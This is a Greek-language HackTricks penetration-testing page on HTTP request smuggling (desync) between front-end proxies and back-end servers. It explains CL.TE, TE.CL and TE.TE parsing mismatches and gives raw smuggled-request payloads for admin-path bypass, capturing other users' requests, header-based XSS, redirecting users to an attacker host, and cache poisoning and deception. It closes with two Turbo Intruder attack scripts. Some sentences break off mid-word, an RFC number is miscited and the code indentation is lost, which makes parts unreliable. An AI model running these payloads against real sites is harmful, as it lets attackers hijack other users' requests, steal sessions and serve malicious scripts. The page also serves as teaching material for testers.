# HTTP Request Smuggling / Επίθεση HTTP Desync

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Τι είναι

Αυτή η ευπάθεια συμβαίνει όταν μια **ασυγχρονισμένη** μεταξύ **προξενύων μπροστά** και του **εξυπηρετητή** επιτρέπει σε έναν **επιτιθέμενο** να **στείλει** ένα αίτημα HTTP που θα ερμηνευθεί ως ένα **μοναδικό αίτημα** από τους **προξενείς μπροστά** (φόρτωση ισορροπίας / αντίστροφης προώθησης) και ως **2 αιτήματα** από τον **εξυπηρετητή**.\
Αυτό επιτρέπει σε έναν χρήστη να **τροποποιήσει το επόμενο αίτημα που φτάνει στον εξυπηρετητή μετά από αυτόν**.

### Θεωρία

[**Προδιαγραφή RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Εάν ληφθεί ένα μήνυμα με και το πεδίο κεφαλίδας Transfer-Encoding και το πεδίο κεφαλίδας Content-Length, το τελευταίο πρέπει να αγνοηθεί.

**Content-Length**

> Η κεφαλίδα προκειμένου να δείξει το μέγεθος του σώματος του μηνύματος, σε bytes, που αποστέλλεται στον παραλήπτη.

**Transfer-Encoding: chunked**

> Η κεφαλίδα Transfer-Encoding καθορίζει τη μορφή κωδικοποίησης που χρησιμοποιείται για την ασφαλή μεταφορά του σώματος του φορτίου στον χρήστη.\
> Το Chunked σημαίνει ότι τα μεγάλα δεδομένα αποστέλλονται σε μια σειρά από τμήματα.

### Πραγματικότητα

Ο **μπροστά** (φόρτωση ισορροπίας / αντίστροφης προώθησης) **επεξεργάζεται** την _**content-length**_ ή την _**transfer-encoding**_ κεφαλίδα και ο **εξυπηρετητής** **επεξεργάζεται την άλλη** προκαλώντας μια **ασυγχρονισμένη** μεταξύ των 2 συστημάτων.\
Αυτό μπορεί να είναι πολύ κρίσιμο καθώς ένας **επιτιθέμενος θα μπορεί να στείλει ένα αίτημα** στον αντίστροφο διακομιστή που θα ερμηνευθεί από τον **εξυπηρετητή** ως **2 διαφορετικά αιτήματα**. Ο **κίνδυνος** αυτής της τεχνικής έγκειται στο γεγονός ότι ο **εξυπηρετητής** θα **ερμηνεύσει** το **2ο ενσωματωμένο αίτημα** σαν να **προήλθε από τον επόμενο πελάτη** και το **πραγματικό αίτημα** αυτού του πελάτη θα είναι **μέρος** του **ενσωματωμένου αιτήματος**.

### Ιδιαιτερότητες

Θυμηθείτε ότι στο HTTP **ένας χαρακτήρας νέας γραμμής αποτελείται από 2 bytes:**

* **Content-Length**: Αυτή η κεφαλίδα χρησιμοποιεί ένα **δεκαδικό αριθμό** για να υποδείξει τον **αριθμό** των **bytes** του **σώματος** του αιτήματος. Το σώμα αναμένεται να τελειώσει με τον τελευταίο χαρακτήρα, **δεν απαιτείται νέα γραμμή στο τέλος του αιτ
#### Ευπάθεια TE.TE (Μεταφορά κωδικοποίησης που χρησιμοποιείται από τους δύο, με απόκρυψη)
- **Διακομιστές:** Και οι δύο υποστηρίζουν `Transfer-Encoding`, αλλά ο ένας μπορεί να εξαπατηθεί να το αγνοήσει μέσω απόκρυψης.
- **Σενάριο Επίθεσης:**
- Ο επιτιθέμενος στέλνει ένα αίτημα με αποκρυμμένους κεφαλίδες `Transfer-Encoding`.
- Ανάλογα με τον διακομιστή (μπροστινό ή πίσω) που αποτυγχάνει να αναγνωρίσει την απόκρυψη, μπορεί να εκμεταλλευτείται μια ευπάθεια CL.TE ή TE.CL.
- Το μη επεξεργασμένο μέρος του αιτήματος, όπως το βλέπει ένας από τους διακομιστές, γίνεται μέρος ενός επόμενου αιτήματος, οδηγώντας σε smuggling.
- **Παράδειγμα:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Σενάριο CL.CL (Content-Length που χρησιμοποιείται από τον μπροστινό και τον πίσω διακομιστή):**
- Και οι δύο διακομιστές επεξεργάζονται το αίτημα μόνο βασιζόμενοι στην κεφαλίδα `Content-Length`.
- Αυτό το σενάριο συνήθως δεν οδηγεί σε smuggling, καθώς υπάρχει συμφωνία στον τρόπο που οι δύο διακομιστές ερμηνεύουν το μήκος του αιτήματος.
- **Παράδειγμα:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Κανονικό Αίτημα
```

#### **Σενάριο CL != 0:**
- Αναφέρεται σε σενάρια όπου η κεφαλίδα `Content-Length` είναι παρούσα και έχει μια τιμή διάφορη από το μηδέν, υποδηλώνοντας ότι το σώμα του αιτήματος έχει περιεχόμενο.
- Είναι κρίσιμο για την κατανόηση και τη δημιουργία επιθέσεων smuggling, καθώς επηρεάζει τον τρόπο με τον οποίο οι διακομιστές καθορίζουν το τέλος ενός αιτήματος.
- **Παράδειγμα:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Μη Κενό Σώμα
```

#### Εξαναγκασμός μέσω κεφαλίδων hop-by-hop

Εκμεταλλευόμενοι τις κεφαλίδες hop-by-hop, μπορείτε να υποδείξετε στον διαμεσολαβητή να **διαγράψει την κεφαλίδα Content-Length ή Transfer-Encoding, έτσι ώστε να είναι δυνατή η κατάχρηση του HTTP request smuggling**.
```
Connection: Content-Length
```
Για **περισσότερες πληροφορίες σχετικά με τις κεφαλίδες hop-by-hop** επισκεφθείτε:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Εντοπισμός HTTP Request Smuggling

Ο εντοπισμός ευπαθειών στο HTTP request smuggling μπορεί συχνά να επιτευχθεί χρησιμοποιώντας τεχνικές χρονομέτρησης, οι οποίες βασίζονται στην παρατήρηση πόσο χρόνο απαιτεί ο διακομιστής για να ανταποκριθεί σε παραπλανημένα αιτήματα. Αυτές οι τεχνικές είναι ιδιαίτερα χρήσιμες για την ανίχνευση ευπαθειών CL.TE και TE.CL. Εκτός από αυτές τις μεθόδους, υπάρχουν και άλλες στρατηγικές και εργαλεία που μπορούν να χρησιμοποιηθούν για την εύρεση τέτοιων ευπαθειών:

### Εύρεση ευπαθειών CL.TE χρησιμοποιώντας τεχνικές χρονομέτρησης
- **Μέθοδος:**
- Αποστείλετε ένα αίτημα που, αν η εφαρμογή είναι ευπαθής, θα καταστήσει τον διακομιστή πίσω από τον διακομιστή να περιμένει για επιπλέον δεδομένα.
- **Παράδειγμα:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Παρατήρηση:**
- Ο διακομιστής μπροστά επεξεργάζεται το αίτημα με βάση το `Content-Length` και διακόπτει το μήνυμα πρόωρα.
- Ο διακομιστής πίσω, περιμένοντας ένα μήνυμα με κομμένα κομμάτια, περιμένει το επόμενο κομμάτι που δεν έρχεται ποτέ, προκαλώντας καθυστέρηση.

- **Ενδείξεις:**
- Χρονικά όρια ή μεγάλες καθυστερήσεις στην απόκριση.
- Λήψη σφάλματος 400 Bad Request από τον διακομιστή πίσω, μερικές φορές με λεπτομερείς πληροφορίες του διακομιστή.

### Εύρεση ευπαθειών TE.CL χρησιμοποιώντας τεχνικές χρονομέτρησης
- **Μέθοδος:**
- Αποστείλετε ένα αίτημα που, αν η εφαρμογή είναι ευπαθής, θα καταστήσει τον διακομιστή πίσω από τον διακομιστή να περιμένει για επιπλέον δεδομένα.
- **Παράδειγμα:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Παρατήρηση:**
- Ο διακομιστής μπροστά επεξεργάζεται το αίτημα με βάση το `Transfer-Encoding` και προωθεί ολόκληρο το μήνυμα.
- Ο διακομιστής πίσω, περιμένοντας ένα μήνυμα με βάση το `Content-Length`, περιμένει επιπλέον δεδομένα που δεν έρχονται ποτέ, προκαλώντας καθυστέρηση.

### Άλλες μέθοδοι για την εύρεση ευπαθειών
- **Ανάλυση Διαφορικής Απόκρισης:**
- Αποστείλετε ελαφρώς διαφορετικές εκδόσεις ενός αιτήματος και παρατηρήστε αν οι αποκρίσεις του διακομιστή διαφέρουν με έναν αναπάντεχο τρόπο, υποδηλώνοντας μια αντιφατική ανάλυση.

- **Χρήση Αυτοματοποιημένων Εργαλείων:**
- Εργαλεία όπως η επέκταση 'HTTP Request Smuggler' του Burp Suite μπορούν να ελέγξουν αυτόματα αυτές τις ευπαθείς σημείωσεις αποστέλλοντας διάφορες μορφές αμφίσημων αιτημάτων και αναλύοντας τις αποκρίσεις.

- **Δοκιμές Ποικιλίας Μήκους Περιεχομένου:**
- Αποστείλετε αιτήματα με μεταβαλλόμενες τιμές `Content-Length` που δεν είναι συμμετρικές με το πραγματικό μήκος του περιεχομένου και παρατηρήστε πώς ο διακομιστής χειρίζεται τέτοιες αναντιστοιχίες.

- **Δοκιμές Ποικιλίας Μεταφοράς-Κωδικοποίησης:**
- Αποστείλετε αιτήματα με ασαφείς ή μη έγκυρες κεφαλίδες `Transfer-Encoding` και παρακολουθήστε πώς ανταποκρίνονται διαφορετικά οι διακομιστές μπροστά και πίσω σε τέτοιες παραπλανήσεις.


### Δοκιμή ευπαθειών στο HTTP Request Smuggling

Αφού επιβεβαιωθεί η αποτελεσματικότητα των τεχνικών χρονομέτρησης, είναι κρίσιμο να επαληθευτεί αν μπορούν να παραπλανηθούν τα αιτήματα του πελάτη. Μια απλή μέθοδος είναι να προσπαθήσετε να δηλητηριάσετε τα αιτήματά σας, για παράδειγμα, να κάνετε ένα αίτημα στο `/` να παράγει μια απόκριση 404. Τα παραδείγματα `CL.TE` και `TE.CL` που συζητήθηκαν προηγουμένως στο [Βασικά Παρα
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Στην επίθεση CL.TE, ο κεφαλίδα `Content-Length` χρησιμοποιείται για το αρχικό αίτημα, ενώ το ενσωματωμένο αίτημα χρησιμοποιεί την κεφαλίδα `Transfer-Encoding: chunked`. Ο προϊστάμενος διακομιστής επεξεργάζεται το αρχικό αίτημα `POST` αλλά αποτυγχάνει να επιθεωρήσει το ενσωματωμένο αίτημα `GET /admin`, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση στη διαδρομή `/admin`.

**Παράδειγμα TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Αντίστροφα, στην επίθεση TE.CL, το αρχικό αίτημα `POST` χρησιμοποιεί το `Transfer-Encoding: chunked`, και το ενσωματωμένο αίτημα που ακολουθεί επεξεργάζεται με βάση την κεφαλίδα `Content-Length`. Όμοια με την επίθεση CL.TE, ο προϊστάμενος διαμεσολαβητής παραβλέπει τον κρυφό αίτημα `GET /admin`, παρέχοντας κατά λάθος πρόσβαση στην περιορισμένη διαδρομή `/admin`.

### Αποκάλυψη αναδιαμόρφωσης αιτήσεων μπροστινού τελεστή <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Οι εφαρμογές συχνά χρησιμοποιούν έναν **μπροστινό διακομιστή** για να τροποποιήσουν τα εισερχόμενα αιτήματα πριν τα προωθήσουν στον πίσω διακομιστή. Μια τυπική τροποποίηση περιλαμβάνει την προσθήκη κεφαλίδων, όπως `X-Forwarded-For: <IP του πελάτη>`, για να μεταβιβάσει την IP του πελάτη στον πίσω διακομιστή. Η κατανόηση αυτών των τροποποιήσεων μπορεί να είναι κρίσιμη, καθώς μπορεί να αποκαλύψει τρόπους για **παράκαμψη προστασιών** ή **αποκάλυψη κρυφών πληροφοριών ή σημείων πρόσβασης**.

Για να ερευνήσετε πώς ένας διαμεσολαβητής αλλοιώνει ένα αίτημα, εντοπίστε ένα παράμετρο POST που ο πίσω διακομιστής επαναλαμβάνει στην απόκριση. Στη συνέχεια, δημιουργήστε ένα αίτημα, χρησιμοποιώντας αυτήν την παράμετρο τελευταία, παρόμοιο με το παρακάτω:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Σε αυτή τη δομή, οι συνεχόμενοι συστατικοί του αιτήματος προστίθενται μετά το `search=`, το οποίο είναι ο παράμετρος που αντανακλάται στην απόκριση. Αυτή η αντανάκλαση θα αποκαλύψει τις κεφαλίδες του επόμενου αιτήματος.

Είναι σημαντικό να ευθυγραμμίσετε την κεφαλίδα `Content-Length` του εμφωλευμένου αιτήματος με το πραγματικό μήκος του περιεχομένου. Είναι συμβουλευτικό να ξεκινήσετε με μια μικρή τιμή και να αυξήσετε σταδιακά, καθώς μια πολύ χαμηλή τιμή θα περικόψει τα αντανακλασμένα δεδομένα, ενώ μια πολύ υψηλή τιμή μπορεί να προκαλέσει σφάλμα στο αίτημα.

Αυτή η τεχνική είναι επίσης εφαρμόσιμη στο πλαίσιο μιας ευπάθειας TE.CL, αλλά το αίτημα πρέπει να τερματίζεται με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες νέας γραμμής, οι τιμές θα προστεθούν στην παράμετρο αναζήτησης.

Αυτή η μέθοδος κυρίως χρησιμεύει για να κατανοήσετε τις τροποποιήσεις που έγιναν στο αίτημα από τον προϊστάμενο διακομιστή, εκτελώντας ουσιαστικά μια αυτο-κατευθυνόμενη έρευνα.

### Καταγραφή αιτημάτων άλλων χρηστών <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Είναι εφικτό να καταγράψετε τα αιτήματα του επόμενου χρήστη προσθέτοντας ένα συγκεκριμένο αίτημα ως την τιμή μιας παραμέτρου κατά τη διάρκεια μιας λειτουργίας POST. Παρακάτω παρουσιάζεται πώς μπορεί να επιτευχθεί αυτό:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Σε αυτό το σενάριο, ο παράμετρος **comment** προορίζεται να αποθηκεύει το περιεχόμενο ενός σχολίου στην ενότητα σχολίων ενός δημόσια προσβάσιμης σελίδας. Ως εκ τούτου, το περιεχόμενο της επόμενης αίτησης θα εμφανίζεται ως σχόλιο.

Ωστόσο, αυτή η τεχνική έχει περιορισμούς. Γενικά, αποθαρρύνει δεδομένα μόνο μέχρι τον διαχωριστή παραμέτρου που χρησιμοποιείται στην καταστραμμένη αίτηση. Για αποστολές φορμών με κωδικοποίηση URL, αυτός ο διαχωριστής είναι το χαρακτήρας `&`. Αυτό σημαίνει ότι το καταγεγραμμένο περιεχόμενο από την αίτηση του θύματος θα σταματήσει στο πρώτο `&`, το οποίο μπορεί ακόμη και να είναι μέρος του αλφαριθμητικού ερωτήματος.

Επιπλέον, αξίζει να σημειωθεί ότι αυτή η προσέγγιση είναι εφικτή και με μια ευπάθεια TE.CL. Σε τέτοιες περιπτώσεις, η αίτηση πρέπει να ολοκληρώνεται με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες αλλαγής γραμμής, οι τιμές θα προσαρτηθούν στην παράμετρο αναζήτησης.

### Χρήση της τεχνικής HTTP request smuggling για εκμετάλλευση του αντανακλαστικού XSS

Η HTTP Request Smuggling μπορεί να χρησιμοποιηθεί για να εκμεταλλευτεί ευάλωτες ιστοσελίδες σε **Αντανακλαστικό XSS**, προσφέροντας σημαντικά πλεονεκτήματα:

* Δεν απαιτείται **αλληλεπίδραση** με τους χρήστες του στόχου.
* Επιτρέπει την εκμετάλλευση του XSS σε μέρη της αίτησης που είναι **συνήθως αδύνατο** να φτάσει, όπως οι κεφαλίδες της αίτησης HTTP.

Σε περιπτώσεις όπου μια ιστοσελίδα είναι ευάλωτη σε Αντανακλαστικό XSS μέσω της κεφαλίδας User-Agent, το παρακάτω φορτίο δείχνει πώς να εκμεταλλευτεί αυτήν την ευπάθεια:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Αυτό το φορτίο είναι δομημένο για να εκμεταλλευτεί την ευπάθεια με τον εξής τρόπο:

1. Έναρξη ενός αιτήματος `POST`, που φαίνεται τυπικό, με έναν κεφαλίδα `Transfer-Encoding: chunked` για να υποδείξει την έναρξη της απάτης.
2. Ακολουθείται από ένα `0`, που σηματοδοτεί το τέλος του σώματος του μηνύματος με κομμάτια.
3. Στη συνέχεια, εισάγεται ένα απατητικό αίτημα `GET`, όπου ο κεφαλίδα `User-Agent` εισάγεται με ένα σενάριο, `<script>alert(1)</script>`, που ενεργοποιεί το XSS όταν ο διακομιστής επεξεργάζεται αυτό το επόμενο αίτημα.

Με τη χρήση της απάτης στο `User-Agent`, το φορτίο παρακάμπτει τους κανονικούς περιορισμούς του αιτήματος, εκμεταλλευόμενο την ευπάθεια του Reflected XSS με ένα μη τυπικό, αλλά αποτελεσματικό τρόπο.

### Χρήση της απάτης στο HTTP request smuggling για να μετατραπεί μια επανεύρεση στον ίδιο ιστότοπο σε μια ανοιχτή επανεύρεση <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Εκμεταλλευόμενοι τις επανευρέσεις στον ίδιο ιστότοπο με την απάτη στο HTTP request smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Οι εφαρμογές συχνά ανακατευθύνουν από ένα URL σε ένα άλλο χρησιμοποιώντας το όνομα κεντρικού υπολογιστή από τον κεφαλίδα `Host` στο URL της ανακατεύθυνσης. Αυτό είναι συνηθισμένο με διακομιστές ιστού όπως το Apache και το IIS. Για παράδειγμα, η αίτηση ενός φακέλου χωρίς κατάληξη με κάθετο γραμμή οδηγεί σε μια ανακατεύθυνση που περιλαμβάνει την κάθετο γραμμή:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Αποτελέσματα σε:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Παρόλο που αρχικά φαίνεται ανώδυνο, αυτή η συμπεριφορά μπορεί να χειραγωγηθεί χρησιμοποιώντας την τεχνική του HTTP request smuggling για να ανακατευθύνει τους χρήστες σε εξωτερική ιστοσελίδα. Για παράδειγμα:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Αυτό το κρυφό αίτημα μπορεί να προκαλέσει την ανακατεύθυνση του επόμενου επεξεργασμένου αιτήματος του χρήστη σε μια ιστοσελίδα που ελέγχεται από τον επιτιθέμενο:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Αποτελέσματα σε:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Σε αυτό το σενάριο, η αίτηση ενός χρήστη για ένα αρχείο JavaScript αποκλέπτεται. Ο επιτιθέμενος μπορεί δυνητικά να απειλήσει τον χρήστη παρέχοντας κακόβουλο κώδικα JavaScript ως απόκριση.

### Χρήση της τεχνικής HTTP request smuggling για την εκτέλεση δηλητηρίασης της προσωρινής μνήμης του ιστού <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Εκμεταλλευόμενοι τη δηλητηρίαση της προσωρινής μνήμης του ιστού μέσω της τεχνικής HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Η δηλητηρίαση της προσωρινής μνήμης του ιστού μπορεί να εκτελεστεί εάν οποιοδήποτε στοιχείο της **υποδομής της πρόσοψης** αποθηκεύει περιεχόμενο, συνήθως για να βελτιώσει την απόδοση. Με την παραπλάνηση της απόκρισης του διακομιστή, είναι δυνατόν να **δηλητηριάσουμε την προσωρινή μνήμη**.

Προηγουμένως, παρατηρήσαμε πώς οι αποκρίσεις του διακομιστή μπορούν να τροποποιηθούν για να επιστρέψουν ένα σφάλμα 404 (ανατρέξτε στα [Βασικά Παραδείγματα](./#basic-examples)). Με ανάλογο τρόπο, είναι εφικτό να εξαπατήσουμε τον διακομιστή ώστε να παραδώσει το περιεχόμενο του `/index.html` αντί για το αίτημα για το `/static/include.js`. Ως αποτέλεσμα, το περιεχόμενο του `/static/include.js` αντικαθίσταται στην προσωρινή μνήμη με αυτό του `/index.html`, καθιστώντας το `/static/include.js` μη προσβάσιμο στους χρήστες και πιθανώς προκαλώντας ένα Απόρριψης της Υπηρεσίας (DoS).

Αυτή η τεχνική γίνεται ιδιαίτερα ισχυρή εάν ανακαλυφθεί μια **ευπάθεια ανοικτής ανακατεύθυνσης** ή εάν υπάρχει μια **επανακατεύθυνση στην ιστοσελίδα προς μια ανοικτή ανακατεύθυνση**. Τέτοιες ευπάθειες μπορούν να εκμεταλλευτούν για να αντικατασταθεί το προσωρινά αποθηκευμένο περιεχόμενο του `/static/include.js` με ένα σενάριο υπό τον έλεγχο του επιτιθέμενου, επιτρέποντας ουσιαστικά μια ευρεία επίθεση Cross-Site Scripting (XSS) κατά όλων των πελατών που ζητούν το ενημερωμένο `/static/include.js`.

Παρακάτω παρουσιάζεται μια εικόνα της εκμετάλλευσης **δηλητηρίασης της προσωρινής μνήμης σε συνδυασμό με μια επανακατεύθυνση στην ιστοσελίδα προς ανοικτή ανακατεύθυνση**. Ο στόχος είναι να τροποποιηθεί το περιεχόμενο της προσωρινής μνήμης του `/static/include.js` για να παρέχει κώδικα JavaScript που ελέγχεται από τον επιτιθέμενο:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Σημειώστε το ενσωματωμένο αίτημα που στοχεύει το `/post/next?postId=3`. Αυτό το αίτημα θα ανακατευθυνθεί στο `/post?postId=4`, χρησιμοποιώντας την τιμή της κεφαλίδας **Host** για να προσδιορίσει τον τομέα. Αλλάζοντας την κεφαλίδα **Host**, ο επιτιθέμενος μπορεί να ανακατευθύνει το αίτημα στον δικό του τομέα (**επανακατεύθυνση στον ίδιο τομέα για ανοικτή ανακατεύθυνση**).

Μετά από επιτυχή **δηλητηρίαση του socket**, πρέπει να προκληθεί ένα **GET αίτημα** για το `/static/include.js`. Αυτό το αίτημα θα μολυνθεί από το προηγούμενο αίτημα **επανακατεύθυνσης στον ίδιο τομέα για ανοικτή ανακατεύθυνση** και θα ανακτήσει το περιεχόμενο του σεναρίου που ελέγχεται από τον επιτιθέμενο.

Στη συνέχεια, οποιοδήποτε αίτημα για το `/static/include.js` θα εξυπηρετεί τον προκαταρκτικά μνημονευμένο κώδικα του σεναρίου του επιτιθέμενου, εκτελώντας αποτελεσματικά μια ευρεία επίθεση XSS.


### Χρήση της τεχνικής HTTP request smuggling για να πραγματοποιηθεί απάτη στην προσωρινή αποθήκευση του ιστού <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Ποια είναι η διαφορά μεταξύ δηλητηρίασης της προσωρινής αποθήκευσης του ιστού και απάτης στην προσωρινή αποθήκευση του ιστού;**
>
> * Στη **δηλητηρίαση της προσωρινής αποθήκευσης του ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο κακόβουλο περιεχόμενο στην προσωρινή αποθήκευση και αυτό το περιεχόμενο εξυπηρετείται από την προσωρινή αποθήκευση σε άλλους χρήστες της εφαρμογής.
> * Στην **απάτη στην προσωρινή αποθήκευση του ιστού**, ο επιτιθέμενος προκαλεί την εφαρμογή να αποθηκεύσει κάποιο ευαίσθητο περιεχόμενο που ανήκει σε άλλο χρήστη στην προσωρινή αποθήκευση και στη συνέχεια ο επιτιθέμενος ανακτά αυτό το περιεχόμενο από την προσωρινή αποθήκευση. 

Ο επιτιθέμενος δημιουργεί ένα απάτητο αίτημα που ανακτά ευαίσθητο περιεχόμενο που αφορά έναν συγκεκριμένο χρήστη. Ας λάβουμε υπόψη το παρακάτω παράδειγμα:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Εάν αυτό το κρυφό αίτημα δηλητηριάσει μια κρυφή καταχώρηση που προορίζεται για στατικό περιεχόμενο (π.χ. `/someimage.png`), τα ευαίσθητα δεδομένα του θύματος από το `/private/messages` μπορεί να αποθηκευτούν κάτω από την καταχώρηση της προσωρινής μνήμης του στατικού περιεχομένου. Ως αποτέλεσμα, ο επιτιθέμενος μπορεί ενδεχομένως να ανακτήσει αυτά τα αποθηκευμένα ευαίσθητα δεδομένα.

### Οπλοποιώντας το HTTP Request Smuggling με την ασυγχρονισμένη απόκριση HTTP

Βρήκατε μια ευπάθεια HTTP Request Smuggling και δεν ξέρετε πώς να την εκμεταλλευτείτε. Δοκιμάστε αυτήν την άλλη μέθοδο εκμετάλλευσης:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Σενάρια Turbo Intruder

### CL.TE

Από [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Από: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Εργαλεία

